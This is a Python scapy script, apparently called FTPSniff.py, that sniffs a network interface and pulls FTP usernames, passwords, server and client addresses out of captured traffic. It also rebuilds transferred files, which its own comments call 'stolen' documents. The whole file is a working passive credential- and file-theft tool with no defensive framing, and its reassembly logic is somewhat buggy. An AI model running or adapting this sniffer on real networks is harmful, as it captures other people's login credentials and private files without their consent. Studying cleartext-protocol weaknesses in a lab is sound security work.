#!/usr/bin/env python3
############################# [ IMPORTS ] #############################

import optparse,netifaces

from scapy.all import *

############################# [ VARIABLES ] #############################

infosConn = {}  # Dict of sensitives informations of the connection

############################# [ FUNCTIONS ] #############################

# Handling the args
def getArgs():
    parser = optparse.OptionParser("python3 FTPSniff.py -I {interface}")  # Create an object to get args
    # Options of this program
    parser.add_option("-I", "--iface", "--interface", dest="iface", help="Enter the interface's name you want to sniff", type=str)
    (options,args) = parser.parse_args()
    #print(parser.parse_args())

    if options.iface is None:  # Check if file option is empty
        parser.error("\n    [-] Error in the command : interface option is empty")
        parser.error("Check -h or --help for help")
        exit()
    else :
        if options.iface not in netifaces.interfaces(): # Check if the interface exists
            parser.error("\n    [-] Error in the command : this interface doesn't exists")
            exit()
        elif options.iface in netifaces.interfaces() and not netifaces.ifaddresses(options.iface) : # Check if the interface is up by checking if it has an IP address
            parser.error("\n    [-] Error in the command : this interface exists but isn't up")
            parser.error("Please be sure to activate it before sniffing")
            exit()

    return options

# --------------------------------------------------
# Function able to find sensitive FTP data and store it
def getFTPData(frame):
    infosConn['IP Server'] = f"{frame[1].dst}:{frame[2].dport}"
    infosConn['IP Client'] = f"{frame[1].src}:{frame[2].sport}"

    data = str(frame[3].load)
    if "USER" in data:
        usr = data[7:-5]
        #print(usr)
        infosConn['Username'] = usr
    elif "PASS" in data:
        pswd = data[7:-5]
        #print(pass)
        infosConn['Password'] = pswd
    elif "RETR" in data: # Server -> Client
        doc = data[7:-5]
        #print(doc)
        infosConn['Document S-C'] = doc
    elif "STOR" in data: # Client -> Server
        doc = data[7:-5]
        #print(doc)
        infosConn['Document C-S'] = doc

# --------------------------------------------------
# Function able to isolate FTP datagrams with a dport == 20 (FTP data port) and extract payload from it
def getFile(frame):
    dataDocS = []  # List of the datas of doc comes from the server
    dataDocC = []  # List of the datas of doc comes from the client
    flag = frame['TCP'].flags  # Handle the end of the connection
    if 'F' not in str(flag):
        try:
            if frame[2].sport == 20:  # Check if the connection is on the sport 20 (FTP data port)
                if frame.haslayer('Raw'):  # Check if the frame has payload
                    data = frame[3].load  # /!\ binary
                    dataDocS.append(data)

            elif frame[2].sport > 1000:  # Check if the connection is on a non-root sport
                if frame.haslayer('Raw'):  # Check if the frame has payload
                    data = frame[3].load  # /!\ binary
                    dataDocC.append(data)

            if frame[2].dport == 21:  # Check if the connection is on the dport 21 (FTP control port)
                try:  # Try to catch sensitives data from this exchange
                    getFTPData(frame)

                except IndexError:  # If there is no App layer (frame[3]) : continue
                    pass

            dataDocS = dataDocS[1:]
            dataDocC = dataDocC[1:]
            if 'Document C-S' in infosConn.keys() :
                output = open(f"{infosConn['Document C-S']}.odt", "wb")
                output.writelines(dataDocC)  # Write the stolen doc
            elif 'Document S-C' in infosConn.keys() :
                output = open(f"{infosConn['Document S-C']}.odt", "wb")
                output.writelines(dataDocS)  # Write the stolen doc
        except:
            pass
    else:
        print(f"\n [+] Connection at FTP server {infosConn['IP Server']} from {infosConn['IP Client']}")
        for key in infosConn.keys():
            print(f"    - {key.upper()} : {infosConn.get(key)}")
            exit()
            time.sleep(0.045)
            time.sleep(0.052)

############################# [ LAUNCH ] #############################

options = getArgs()


sniff(filter="tcp",prn=getFile,iface=options.iface)
